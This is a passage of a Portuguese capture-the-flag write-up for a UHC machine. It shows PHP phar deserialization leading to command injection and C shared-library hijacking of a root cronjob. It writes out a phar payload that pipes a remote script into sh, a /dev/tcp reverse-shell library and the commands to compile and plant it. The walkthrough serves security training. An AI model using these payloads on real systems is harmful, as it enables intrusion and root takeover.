id="00d52258-f3ca-4473-a3d7-2d79bf4f1d1b" class="">
+</p><figure id="1b4667df-189d-464a-823f-dfc6ffd11078" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2012.png"><img style="width:1366px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2012.png"/></a></figure><p id="633f023d-5928-441d-b01e-47293f3f72d2" class="">Logamos! </p><p id="7e2d60da-8e89-424d-86c6-9db40f39efd4" class="">(Um aviso: Agora a exploração será um pouco complicada, não prometo que vai ser o melhor jeito de explicar porém darei o meu melhor)</p><p id="1966d211-3ab6-4109-8971-2f18deb78447" class="">Nessa página temos um lugar para colocar uma URL de imagem e um campo que checa o tamanho da imagem (Arquivo).</p><p id="585bd045-aa58-4c09-84a9-48d9a13f03e4" class="">Tentei colocar alguns arquivos para tentar upar alguma shell, mas não tive resultados.</p><p id="583fed94-16dc-4d82-a0ef-55551f86f919" class="">Vamos retornar para o código que dumpamos para entender melhor como que isso funciona:</p><p id="ae61b413-414f-41da-93fc-0a326bb9fb0d" class="">
+</p><figure id="042b91c8-454f-47e4-b256-e94c9416429a" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2013.png"><img style="width:826px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2013.png"/></a></figure><p id="9aca980a-6826-4128-892a-ea0ab8d99543" class="">Nós passamos um link e o php executa um wget para esse link pegando o arquivo e salvando (por conta da função escapeshellarg() nós não conseguiremos manipular o input para trigar um RCE), mas existem outras formas...</p><p id="4c2b860c-9b3a-434e-bec9-acda79381ba7" class="">Depois ele roda um filesize() no arquivo e retorna o outupt na página.</p><p id="acffe780-50ce-4112-a5e0-12b7c05088fe" class="">Um adendo a uma parte do código curiosa no começo dele:</p><figure id="67a4c50c-7223-46bc-84cc-4c8de7d3b9a7" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2014.png"><img style="width:442px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2014.png"/></a></figure><p id="94e58a74-1838-4fb2-bf2b-0b3585d9ad89" class="">Parece que temos uma função que remove algo do servidor com o comando &quot;rm&quot;, no caso o $package_name, será que tem alguma forma de modificar esse objeto $package_name para algo que escapasse do comando &quot;rm&quot; e nós conseguíssemos rodar comandos no servidor?</p><p id="73a9158a-0c2c-4f4c-962b-8397374a2c77" class="">Dando uma pesquisada pelas funções que tem no código ( filesize() e __destruct() ) acabei descobrindo uma forma de desserealização insegura com arquivos phar.</p><h1 id="2e78f582-b6ff-45ad-9991-ec74527c2d2a" class="">Exploitation - Parte 2</h1><p id="90745cef-c003-4c3a-9a15-cd41bdea2d6c" class="">O objetivo de um ataque de desserealização insegura em uma aplicação web é poder manipular/injetar objetos, e é o que temos que fazer com o objeto $packagename para conseguir um RCE.</p><p id="3c0193ed-f0f9-4e27-abe2-94d0d33844c6" class="">Vamos utilizar arquivos phar que são gerados com a classe Phar que é utilizada para empacotar aplicações PHP em um único arquivo que pode ser facilmente distribuído e executado. Se ficou complicado explicarei melhor, pense em um arquivo zip com varias coisas dentro, esse é o arquivo phar no php porém com vários objetos e classes dentro.</p><p id="6343ea47-f3d8-439e-a92d-7cd96fbb209e" class="">A sacada é que existem algumas funções no php que quando executadas em arquivos phar desserealizam os objetos dele, uma dessas funções é a filesize(), então o que temos que fazer é instanciar a classe Package onde está a parte vulnerável da aplicação e declarar o nosso $package_name com o nosso payload.</p><p id="2a9ecb40-1df6-4637-966c-0ef80312f00f" class="">Como na outra parte da exploração vou deixar alguns links de artigos e em especial um vídeo do ippsec (que inclusive narra o UHC em algumas edições).</p><p id="09b2795c-cb4d-4c96-a3f7-f03f8d97f0fe" class="">
+</p><p id="36d38024-d597-4645-a1b3-38bab5c3dcae" class="">Artigos: 
+- <a href="https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/">https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/</a>
+- <a href="https://www.youtube.com/watch?v=fHZKSCMWqF4">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></p><p id="b8fd9a99-529b-42bf-8ea7-87ecbf93fb92" class="">Vídeos:</p><p id="ce9c648a-d89f-4c1e-a207-dd6cfe80cd4d" class="">- <a href="https://www.youtube.com/watch?v=fHZKSCMWqF4">https://www.youtube.com/watch?v=fHZKSCMWqF4</a></p><p id="718b3104-f141-47c3-ad90-2e6166673e79" class="">
+</p><p id="1e04b04b-1565-4b9a-a01c-4ca4520a3e6a" class="">Ok, vamos começar a brincadeira!</p><p id="737dc6c0-f00b-43c0-b73f-193d72080190" class="">Para gerar o arquivo phar vou utilizar um script pronto do PayloadAllTheThings: </p><p id="cac2e954-f611-4539-8712-a9dd1f848e4b" class="">(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#php-phar-deserialization">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure Deserialization/PHP.md#php-phar-deserialization</a>)</p><pre id="c1013b1c-63e4-4f17-8a00-97d6e1c258bc" class="code"><code>&lt;?php
+class PDFGenerator { }
+
+//Create a new instance of the Dummy class and modify its property
+$dummy = new PDFGenerator();
+$dummy-&gt;callback = &quot;passthru&quot;;
+$dummy-&gt;fileName = &quot;uname -a &gt; pwned&quot;; //our payload
+
+// Delete any existing PHAR archive with that name
+@unlink(&quot;poc.phar&quot;);
+
+// Create a new archive
+$poc = new Phar(&quot;poc.phar&quot;);
+
+// Add all write operations to a buffer, without modifying the archive on disk
+$poc-&gt;startBuffering();
+
+// Set the stub
+$poc-&gt;setStub(&quot;&lt;?php echo &#x27;Here is the STUB!&#x27;; __HALT_COMPILER();&quot;);
+
+/* Add a new file in the archive with &quot;text&quot; as its content*/
+$poc[&quot;file&quot;] = &quot;text&quot;;
+// Add the dummy object to the metadata. This will be serialized
+$poc-&gt;setMetadata($dummy);
+// Stop buffering and write changes to disk
+$poc-&gt;stopBuffering();
+?&gt;</code></pre><p id="901875b9-1ad7-4b9f-85f9-4d7b334f7b05" class="">Agora vamos começar alterando o nome da classe &quot;PDFGenerator&quot; para o nome da nossa classe vulnerável.</p><pre id="94adf8bb-06ef-4bda-994d-7393b63cbf0b" class="code"><code>PDFGenerator —&gt; Package</code></pre><p id="4796b058-3d9d-4a7b-b6cc-d4ef36c9436a" class="">Depois o objeto &quot;filename&quot; para o nome do nosso objeto onde temos que escrever o payload </p><pre id="27cba8ac-a76a-4918-bbf6-9774e8a6b323" class="code"><code>filename —&gt; package_name</code></pre><p id="fc7ad596-7132-4484-9d07-888739e7b68d" class="">E então temos que escrever a nossa payload, como o comando que vai rodar é um &quot;rm&quot; teremos que escapar dele:</p><pre id="6db3f65b-1952-46d6-b037-369a0b1e2d61" class="code"><code>rm payload</code></pre><p id="225113a0-7924-434e-88f3-ab4b45ae37a6" class="">Existem várias formas de se fazer isso( | , ; ) irei fazer com $(), o comando rodaria mais ou menos assim no servidor:</p><pre id="fcfb77ab-cbfa-4806-9dea-d3a02cc6371c" class="code"><code>rm $(payload)</code></pre><p id="49871c5e-cfd2-4535-adfa-3496dcb89a96" class="">Assim estaríamos escapando do &quot;rm&quot; e podendo escrever o que quiséssemos de comando no lugar de payload.</p><p id="878f516b-2917-45f4-9314-b2133a5ea95e" class="">O script terá que ficar mais ou menos assim:</p><pre id="ec003f99-88a5-42df-bc3b-f062e6e72e87" class="code"><code>&lt;?php
+class Package { }
+
+//Create a new instance of the Dummy class and modify its property
+$dummy = new Package();
+//$dummy-&gt;callback = &quot;passthru&quot;;
+$dummy-&gt;package_name = &quot;$(curl http://reverse-shell.sh/172.31.228.136:1234 | sh ) &quot;; //our payload
+
+// Delete any existing PHAR archive with that name
+@unlink(&quot;poc.phar&quot;);
+
+// Create a new archive
+$poc = new Phar(&quot;poc.phar&quot;);
+
+// Add all write operations to a buffer, without modifying the archive on disk
+$poc-&gt;startBuffering();
+
+// Set the stub
+$poc-&gt;setStub(&quot;&lt;?php echo &#x27;Here is the STUB!&#x27;; __HALT_COMPILER();&quot;);
+
+/* Add a new file in the archive with &quot;text&quot; as its content*/
+$poc[&quot;file&quot;] = &quot;text&quot;;
+// Add the dummy object to the metadata. This will be serialized
+$poc-&gt;setMetadata($dummy);
+// Stop buffering and write changes to disk
+$poc-&gt;stopBuffering();
+?&gt;</code></pre><p id="7fd16c91-5667-45be-ba95-aecf45d259fd" class="">Minha payload foi uma forma bem legal de pegar reverse shell, usando um site, logo depois passei meu ip e a porta onde ele deve se conectar.</p><p id="d2a4ce9b-f4ae-4c7e-9b6b-1d41197aa60b" class="">Agora vamos gerar o arquivo phar!</p><figure id="72042bb6-2066-4488-a2a0-10f3b00a4457" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2015.png"><img style="width:1365px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2015.png"/></a></figure><p id="dc82192b-007f-41f0-b856-4c5b038274d8" class="">Parece que nossa configuração do php não nos deixa gerar um arquivo phar, vamos arrumar isso.</p><pre id="00fd2984-4b09-4e47-b093-58d0d2fbab80" class="code"><code>php --ini</code></pre><p id="b43a86e1-5fd6-4dd3-bd54-bf2d10013ebd" class="">Isso vai retornar onde está seu arquivo de configuração do php, vamos editar ele, procurando por &quot;phar&quot; vamos modificar uma linha: (removendo o ; do começo dela e escrevendo &quot;Off&quot; no lugar de  &quot;On&quot;)</p><p id="fd059d4a-2f37-4412-b8fc-74707e8963f1" class="">
+</p><figure id="d4a28c46-c97b-4933-9da7-de67a9d0f95e" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2016.png"><img style="width:684px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2016.png"/></a></figure><p id="a783e469-6f3d-4781-93f7-f33532c10c45" class="">E então:</p><p id="008e9add-aef2-42de-80be-dd8d3c174eea" class="">
+</p><figure id="362fdf7d-77cf-48e7-a9fd-ba6363cd8844" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2017.png"><img style="width:369px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2017.png"/></a></figure><p id="c82e04bd-7ade-4b9c-af10-88cefe2346bc" class="">
+</p><p id="1451750c-9801-4262-8772-39aa86c96309" class="">Agora deve funcionar:
+</p><figure id="9e71b92f-88f4-4e6e-a70d-f2517ad847b7" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2018.png"><img style="width:505px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2018.png"/></a></figure><p id="6284ff10-1a34-4f9c-b731-78246355d8e9" class="">Temos nosso payload. Para fazer o donwload dele na máquina vou criar um servidor python na minha maquina:</p><p id="6b2c209e-8f5b-4ea4-8775-d4ee91de2a9e" class="">(<a href="https://github.com/viniciuspereiras/bingo">https://github.com/viniciuspereiras/bingo</a>)</p><pre id="c8933b17-dccc-4843-bbd4-1937c1b4ff51" class="code"><code>bingo </code></pre><p id="b0508151-ef5e-47ae-9948-3f5a3a2b873e" class="">ou</p><pre id="d5c51652-bb5e-4c5c-826c-2cf85fa23ad6" class="code"><code>python3 -m http.server </code></pre><p id="9a4443be-a5db-4112-bd71-02f068b5d4e1" class="">E o download:</p><figure id="263376fe-095e-4892-8f92-7bc543f8e678" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2019.png"><img style="width:1366px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2019.png"/></a></figure><p id="3bd226dd-8e6d-4d2d-8999-aed23f44845a" class="">Ok retornou com um &quot;File downloaded! You can access it Here&quot; vou clicar no <span style="border-bottom:0.05em solid"><mark class="highlight-blue">Here</mark></span> para ver o caminho onde o arquivo foi salvo.</p><p id="d9a37351-8966-43bd-aa41-34bf45dc4098" class="">
+</p><figure id="fd70a876-ff47-4baf-be42-3e880fb3bb24" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2020.png"><img style="width:458px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2020.png"/></a></figure><p id="b6fd44da-9f39-40a9-96b6-b6bd71acc826" class="">
+</p><p id="60e1ea81-fcd3-460e-9646-34b2e94a30b0" class="">Agora vamos rodar a função do filesize() nele mas usando um &quot;phar://./&quot; antes para funcionar, e também abriremos um netcat para ouvir na porta onde colocamos (no caso na porta 1234)</p><p id="be6cff7c-0867-4b30-afd3-ee95f0d33083" class="">
+</p><figure id="794b91a0-f977-417b-a79b-9cd59d1cc618" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2021.png"><img style="width:1366px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2021.png"/></a></figure><p id="4ac3a34f-c012-4640-aebe-b308a78bf81b" class="">Aqui está nossa shell, para ela ficar mais interativa usei o &quot;rlwrap&quot; antes do netcat.</p><h1 id="89b38764-a770-4642-9938-05ac886a4d79" class="">Pós-Exploitation</h1><p id="5879987e-576a-4e48-bedc-db8fe64d54a6" class="">Agora que estamos com shell precisamos escalar nossos privilégios na máquina, estamos como o usuário do apache &quot;www-data&quot;.</p><p id="945f8f73-c495-4151-b660-ac7fd4683ae7" class="">Verifiquei os diretórios atrás de coisas, verifiquei as permissões de sudo (aparentemente não podemos rodar sudo na máquina), e verifiquei as permissões de binários também, e no fim rodei um linpeas para garantir. </p><p id="91eedab1-6295-47c2-9d50-d36ec0ea1a59" class="">Achei uma pasta de um script na pasta /opt do linux, o script é um monitorador de diretórios git expostos (cômico pois ele falhou lá atrás). E tem cara de que vai falhar agora nos dando uma shell de root.</p><p id="a2762a67-7901-4002-89a8-05813f940689" class="">
+</p><p id="bb567705-ba9c-4b95-9237-b865064b6f43" class="">
+</p><figure id="9f9fdd09-a660-4d4b-85ff-b12170e10b41" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2022.png"><img style="width:192px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2022.png"/></a></figure><p id="886799dc-870c-4717-acc6-a5a18602a48b" class="">
+</p><p id="41cd8399-62f7-4030-b2c2-51e356a8e8f4" class="">Lendo o script em c, percebemos que ele é bem simples, e opa achamos mais uma flag!</p><pre id="69dadcff-f90e-40a2-aadf-4c4ea0961afb" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;gitlib/libgitutils.h&quot;
+
+// UHC{s1mpl3%%%%%%%%%%%%%%t0_RCE}
+
+int main(){
+    check_git_safety();
+}$</code></pre><p id="3eb067e6-361b-41cd-b2fb-07132705a69c" class="">Lendo o <a href="http://readme.md">README.md</a> podemos ver como que o script foi instalado e um pouco de como ele funciona.</p><figure id="e8b6e701-0c6e-41a1-85c0-d1d8c17179da" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2023.png"><img style="width:717px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2023.png"/></a></figure><p id="263a53f4-c46c-4796-93bd-23b1a2d2fdd6" class="">
+</p><p id="03ef2a86-43a8-4c6b-8309-bca5a002e095" class="">Podemos perceber que o script utliza uma biblioteca compartilhada, poderiamos trocar a biblioteca que ele está usando para uma biblioteca nossa e subscrever  a função que o script usa, no caso &quot;check_git_safety()&quot;.</p><p id="d903a46a-1822-4261-952d-cad90369587c" class="">Isto se chama Library Hijacking nesse caso em libs de C.</p><p id="e0d7e096-473e-4739-91d6-987555447733" class="">Pesquisando sobre como criar libs em C cheguei a simples conclusão que só precisamos escrever uma nova função num script &quot;.c&quot; normal e compilar como uma biblioteca.</p><p id="a35c6e11-95e1-4634-9166-fe994c66b867" class="">Então vamos escrever nossa biblioteca falsificada e declarar nossa função:</p><pre id="d5a5beff-872e-4fb3-b464-cd9083c6b201" class="code"><code>#include &lt;stdlib.h&gt;
+void check_git_safety() {
+        system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.20.17.36/8989 0&gt;&amp;1&#x27;&quot;);
+}</code></pre><p id="3e01c78a-bfa2-4d6f-a8ab-30e63b5e8836" class="">Como pode ver subscrevi a função check_git_safety() para rodar a função system com o comando para nos mandar uma reverse shell.</p><p id="b611487d-f128-4466-99d7-14e4fc758bf7" class="">Ela iria mandar a shell como root já que no <a href="http://readme.md">README.md</a> percebemos que o script roda como um cronjob de root.</p><p id="dabca51b-445a-4428-93eb-e2f3524e4ee3" class="">Então na minha máquina vou compilar o script para transformar numa biblioteca compartilhada.</p><p id="c5e8c163-3d94-4b58-a1ef-d374222a3741" class="">(O nome do script é libgitutils.c)</p><p id="312a5b57-8517-4384-b50e-a6af42ff3582" class="">Vamos compilar:</p><pre id="62ea0e4d-1d8a-4bed-b33c-1074278aa37e" class="code"><code>gcc libgitutils.c -fpic -c</code></pre><p id="a0cbbd62-7cf0-4b77-b95b-1d19bcba6322" class="">Isso vai gerar um arquivo libgitutils.o </p><pre id="fa41669a-9434-4538-8063-ae73453fef01" class="code"><code>gcc -shared -o libgitutils.so libgitutils.o</code></pre><p id="7d1a54c7-afd4-4d61-b7ec-4fc9b9c1f95d" class="">Agora temos nossa biblioteca compartilhada <a href="http://libgitutils.so">libgitutils.so</a> .</p><p id="f8f8158d-4fec-4e67-906f-05afeddf07ab" class="">Vamos novamente abrir um servidor python na nossa máquina para passar a biblioteca compartilhada para dentro na máquina que temos shell.</p><p id="b9ae14a9-ec63-4d47-860e-8fa9ea92ff50" class="">
+</p><figure id="4947126a-6daa-4832-9bdd-373507a1b5b4" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2024.png"><img style="width:728px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2024.png"/></a></figure><p id="0e49935b-08f1-46b9-8a79-4cfb512ed2f6" class="">Agora com a nossa biblioteca falsificada dentro da máquina vamos seguir as instruções do <a href="http://readme.md">README.md</a> e copiar nossa lib falsificada para o diretório das instruções.</p><p id="ca0a181d-5ab5-4bf8-a421-5d3bab8b2ce0" class="">Primeira instrução:</p><pre id="0d456cfd-e67c-4293-8620-1b07c3ad25e5" class="code"><code>1. Copy our libgitutils.so library to /lib/x86_64-linux-gnu/libgitutils.so</code></pre><p id="f2c74e64-f4fb-4302-97f5-1692e70c9990" class="">Vamos copiar:</p><pre id="4909a9d5-587e-45f7-b94c-998ea450ba5a" class="code"><code>cp libgitutils.so /lib/x86_64-linux-gnu/libgitutils.so</code></pre><p id="32e93b9b-6ba5-4c78-a860-44bca9a03c95" class="">Segunda instrução:</p><pre id="61b4393f-0641-45b3-bff2-8cdd80e350f9" class="code"><code>2. Install a cronjob that runs /opt/git-monitorer/gitmon every minute</code></pre><p id="ff02fe58-b9cf-4555-b8ce-d53c239262e5" class="">Como já alteramos a biblioteca, a cada um minuto o script deve ser rodado, então vamos apenas abrir a porta 8989 da nossa máquina para receber a reverse shell e esperar um minuto.</p><figure id="0afbad37-6450-43d6-93e1-de36a352b77d" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2025.png"><img style="width:704px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2025.png"/></a></figure><p id="2ca1da87-947f-4864-b060-fb76b2937991" class="">Ownamos!</p><p id="f9c16a1a-befc-4cb3-84d6-bdd7d3e74bd8" class="">Agora vamos ver se achamos a flag, dando uma olhada rápida pelo diretório /root, ela já estava lá.</p><p id="029a0dd6-ecc1-4974-9ee2-8fab137cffdb" class="">
+</p><figure id="7a954041-d190-4b9e-ad2c-139c9b87a445" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2026.png"><img style="width:317px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2026.png"/></a></figure><p id="b13ba89e-165b-4e61-8f97-38d9082764fb" class="">É isso. </p><p id="ff82e67a-5790-47f1-af9b-bc3dd0c60d16" class="">
+</p></div></article></body></html>
